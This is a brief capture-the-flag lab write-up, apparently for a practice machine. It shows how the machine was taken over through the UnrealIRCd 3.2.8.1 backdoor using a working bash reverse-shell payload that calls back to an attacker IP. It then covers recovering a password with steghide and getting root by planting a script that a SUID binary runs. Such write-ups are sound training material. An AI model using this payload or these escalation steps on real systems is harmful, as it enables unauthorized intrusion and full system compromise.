From the information from nmap scan.
Tried connecting to the IRC server with nc 10.10.10.117 6697
There is a backdoor vulnerability on the UnrealIRCd version3.2.8.1
https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html

send payload to the vulnerable IRC server:
echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.2/9999 0>&1'" | nc 10.10.10.117 6697

=> got foothold, /etc/passwd shows there's an user: djmardov -> needs to prives here.
Hint is in a hidden file in /home/djmardov/Documents/.backup
a password to a steg file

=> use steghide to extract the secret from the irked.jpg image in the http site.
The secret is the ssh password of the user djmardov.
user.txt pwned

----------------------------

PRIVES to root.
Enum with linpeas.sh
couple of interesting findings, went down the rabbit hole with the suid 'at' binary (/usr/bin/at)
The actually prives vector is at /usr/bin/viewuser - a custom suid binary
ltrace shows it executes (system()) the file /tmp/listusers -> we can epxloit this
create a file /tmp/listusers

#!/bin/bash
/bin/bash

chmod +x listusers

-> root shell popped
root.txt pwned
